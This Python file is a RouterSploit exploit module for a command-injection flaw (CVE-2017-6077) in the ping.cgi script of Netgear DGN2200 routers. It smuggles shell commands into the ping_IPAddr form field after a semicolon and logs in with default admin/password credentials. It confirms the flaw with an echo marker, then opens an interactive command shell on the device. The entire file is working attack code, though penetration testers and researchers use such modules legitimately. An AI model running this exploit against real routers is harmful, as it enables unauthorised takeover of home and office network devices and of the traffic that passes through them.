from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netgear DGN2200 RCE",
        "description": "Exploits Netgear DGN2200 RCE vulnerability in the ping.cgi script.",
        "authors": (
            "SivertPL",  # vulnerability discovery
            "Josh Abraham <sinisterpatrician[at]google.com>",  # routesploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/41394/",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6077",
        ),
        "devices": (
            "Netgear DGN2200v1",
            "Netgear DGN2200v2",
            "Netgear DGN2200v3",
            "Netgear DGN2200v4",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("admin", "Username")
    password = OptString("password", "Password")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, command):
        data = {
            "IPAddr1": 12,
            "IPAddr2": 12,
            "IPAddr3": 12,
            "IPAddr4": 12,
            "ping": "Ping",
            "ping_IPAddr": "12.12.12.12; " + command
        }
        referer = "{}/DIAG_diag.htm".format(self.target)
        headers = {'referer': referer}

        r = self.http_request(
            method="POST",
            path="/ping.cgi",
            data=data,
            auth=(self.username, self.password),
            headers=headers
        )
        if r is None:
            return ""

        result = self.parse_output(r.text)
        return result

    def parse_output(self, text):
        yet = False
        result = []
        for line in text.splitlines():
            if line.startswith("<textarea"):
                yet = True
                continue
            if yet:
                if line.startswith("</textarea>"):
                    break
                result.append(line)
        return "\n".join(result)

    @mute
    def check(self):
        """
        Method that verifies if the target is vulnerable.
        """
        rand_marker = utils.random_text(6)
        command = "echo {}".format(rand_marker)

        if rand_marker in self.execute(command):
            return True

        return False
